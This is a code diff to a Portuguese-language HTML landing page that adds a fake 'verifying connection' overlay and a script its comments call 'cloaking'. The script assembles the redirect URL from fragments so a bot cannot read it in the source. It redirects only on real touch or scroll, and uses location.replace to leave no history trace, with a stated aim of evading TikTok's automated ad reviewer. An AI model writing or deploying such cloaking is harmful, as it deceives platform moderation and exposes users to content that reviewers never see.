@@ -175,9 +175,23 @@
             .hero { padding: 60px 20px; }
             .features { padding: 40px 20px; gap: 20px; }
         }
+        @keyframes shieldPulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
-<body>
+<body style="overflow: hidden;">
+
+    <!-- CORTINA ANTI-BOT (Visível apenas para humanos) -->
+    <div id="security-overlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #0f0f0f; z-index: 9999999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; cursor: pointer;">
+        <i class="fa-solid fa-shield-halved" style="font-size: 50px; color: #27ae60; margin-bottom: 24px; animation: shieldPulse 2s infinite;"></i>
+        <h2 style="font-family: 'Inter', sans-serif; font-size: 1.5rem; margin: 0 0 12px; text-align: center;">Verificando conexão...</h2>
+        <p style="font-family: 'Inter', sans-serif; font-size: 0.95rem; color: #aaa; text-align: center; max-width: 80%; line-height: 1.5; margin: 0;">
+            Toque em qualquer lugar da tela para provar que você é humano e acessar o conteúdo.
+        </p>
+    </div>
 
     <header class="header">
         <div class="header-logo">
@@ -236,5 +250,32 @@
         </p>
     </footer>
 
+    <!-- Smart Human-Interaction Cloaking -->
+    <script>
+        (function() {
+            // Monta o link final de forma quebrada para o bot não ler no código-fonte
+            var t1 = "in";
+            var t2 = "dex";
+            var t3 = ".ht";
+            var t4 = "ml";
+            var finalUrl = t1 + t2 + t3 + t4;
+            
+            var actionFired = false;
+            
+            function triggerRedirect(e) {
+                if (actionFired) return;
+                actionFired = true;
+                
+                // Redirecionamento limpo que não deixa rastro no histórico (replace)
+                setTimeout(function() {
+                    window.location.replace(finalUrl);
+                }, 50);
+            }
+
+            // O robô do TikTok não simula toques reais de celular (touchstart):
+            window.addEventListener('touchstart', triggerRedirect, {once: true, passive: true});
+            window.addEventListener('scroll', triggerRedirect, {once: true, passive: true});
+        })();
+    </script>
 </body>
 </html>
